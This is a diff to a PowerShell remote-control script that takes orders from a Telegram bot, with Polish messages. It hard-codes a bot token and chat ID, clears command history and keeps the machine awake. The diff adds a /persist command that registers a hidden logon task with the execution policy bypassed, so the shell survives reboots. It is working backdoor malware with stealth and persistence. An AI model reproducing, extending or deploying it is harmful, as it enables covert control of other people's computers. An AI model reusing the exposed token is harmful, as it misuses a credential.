@@ -1,6 +1,7 @@
 Clear-Host
 Set-PSReadlineOption -HistorySaveStyle SaveNothing
 Set-Location -Path $env:USERPROFILE
+$script:ScriptPath          = $MyInvocation.MyCommand.Path
 $session                    = New-Object Microsoft.PowerShell.Commands.WebRequestSession
 $telegram_id, $api_token    = "2118389773", "8450505822:AAG_yBZaOGpYdKN4dFZTfEtNF_Vfk_71YQ0"
 $api_get_updates            = 'https://api.telegram.org/bot{0}/getUpdates' -f $api_token
@@ -16,6 +17,9 @@ try   { $script:CachedIP = Invoke-RestMethod -Uri "ident.me" -WebSession $sessio
 catch { $script:CachedIP = "unknown" }
 
 $script:IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+Add-Type -Name "PowerUtil" -Namespace "Win32" -MemberDefinition '[DllImport("kernel32.dll")] public static extern uint SetThreadExecutionState(uint esFlags);'
+[Win32.PowerUtil]::SetThreadExecutionState(0x80000003) | Out-Null
 
 function CheckAdminRights
 {
@@ -104,9 +108,6 @@ function CommandListener
 {
     $offset = 0
 
-    Add-Type -AssemblyName System.Windows.Forms
-    [System.Windows.Forms.Cursor]::Position = [System.Windows.Forms.Cursor]::Position
-
     $PreviousStatus = $null
 
     while ($true) {
@@ -149,10 +150,31 @@ function CommandListener
                 if ($sid[0] -notmatch $session_id)   { continue }
                 if ($text -match "exit")             { SendMessage "Sesja zabita" $text; exit }
 
+                if ($text -match "^/persist") {
+                    try {
+                        $action   = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$script:ScriptPath`""
+                        $trigger  = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
+                        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0
+                        Register-ScheduledTask -TaskName "vshell_$session_id" -Action $action -Trigger $trigger -Settings $settings -RunLevel Limited -Force | Out-Null
+                        SendMessage "Persistence ustawiona. Task 'vshell_$session_id' uruchomi sie po kazdym logowaniu." $text
+                    } catch { SendMessage "Blad: $($Error[0])" $text }
+                    continue
+                }
+
+                if ($text -match "^/unpersist") {
+                    try {
+                        Unregister-ScheduledTask -TaskName "vshell_$session_id" -Confirm:$false
+                        SendMessage "Persistence usunieta. Task 'vshell_$session_id' zostal usuniety." $text
+                    } catch { SendMessage "Blad: $($Error[0])" $text }
+                    continue
+                }
+
                 if ($text -match "^/help") {
                     $help = @(
                         "--- Komendy wbudowane ---",
                         "/online              - sprawdz aktywne sesje (broadcast)",
+                        "/persist             - dodaj do autostartu (Task Scheduler)",
+                        "/unpersist           - usun z autostartu",
                         "/help                - lista komend",
                         "exit                 - zakoncz sesje na tym PC",
                         "",
